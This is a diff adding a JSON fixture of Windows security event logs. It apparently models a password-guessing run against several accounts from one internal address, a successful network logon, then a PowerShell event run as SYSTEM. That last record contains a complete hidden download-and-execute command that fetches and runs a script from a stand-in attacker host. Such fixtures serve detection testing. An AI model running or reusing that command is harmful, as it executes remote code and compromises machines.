@@ -1,0 +1,7 @@
+[
+  {"_time": "2026-05-31T22:15:00Z", "EventCode": 4625, "SubStatus": "0xC000006A", "TargetUserName": "jdoe", "IpAddress": "192.168.10.45", "LogName": "Security", "SourceModuleName": "WinEventLog"},
+  {"_time": "2026-05-31T22:15:05Z", "EventCode": 4625, "SubStatus": "0xC000006A", "TargetUserName": "admin", "IpAddress": "192.168.10.45", "LogName": "Security", "SourceModuleName": "WinEventLog"},
+  {"_time": "2026-05-31T22:15:10Z", "EventCode": 4625, "SubStatus": "0xC000006A", "TargetUserName": "service_account", "IpAddress": "192.168.10.45", "LogName": "Security", "SourceModuleName": "WinEventLog"},
+  {"_time": "2026-05-31T22:16:22Z", "EventCode": 4624, "LogonType": 3, "TargetUserName": "service_account", "IpAddress": "192.168.10.45", "LogName": "Security", "SourceModuleName": "WinEventLog"},
+  {"_time": "2026-05-31T22:18:00Z", "EventCode": 4104, "ScriptBlockText": "powershell.exe -nop -w hidden -c $i=new-object net.webclient;$i.proxy=[System.Net.WebRequest]::GetSystemWebProxy();$i.Proxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials;IEX $i.downloadstring('http://badactor.xyz/payload.ps1');", "User": "SYSTEM", "LogName": "Microsoft-Windows-PowerShell/Operational", "SourceModuleName": "WinEventLog"}
+]
